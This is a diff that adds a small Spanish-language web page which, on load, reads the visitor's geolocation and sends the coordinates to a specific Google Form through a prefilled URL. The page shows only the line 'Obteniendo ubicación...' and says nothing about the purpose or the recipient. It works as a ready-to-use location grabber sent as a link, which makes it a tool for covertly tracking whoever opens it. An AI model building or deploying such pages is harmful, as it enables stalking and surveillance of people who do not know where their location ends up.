@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Capturando ubicación...</title>
+    <script>
+      function enviarUbicacion() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const ubicacion = lat + "," + lon;
+
+            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSe9XfDR5W5ZTmh4u7FAdEW7rRr2b9WX2uwOn3CSgFl0vmY85g/viewform?usp=pp_url";
+            const finalUrl = formUrl + "&entry.1869713733=" + encodeURIComponent(ubicacion);
+
+            window.location.href = finalUrl;
+          }, function(err) {
+            alert("No se pudo obtener la ubicación.");
+          });
+        } else {
+          alert("Tu navegador no soporta geolocalización.");
+        }
+      }
+
+      window.onload = enviarUbicacion;
+    </script>
+  </head>
+  <body>
+    <p>Obteniendo ubicación...</p>
+  </body>
+</html>
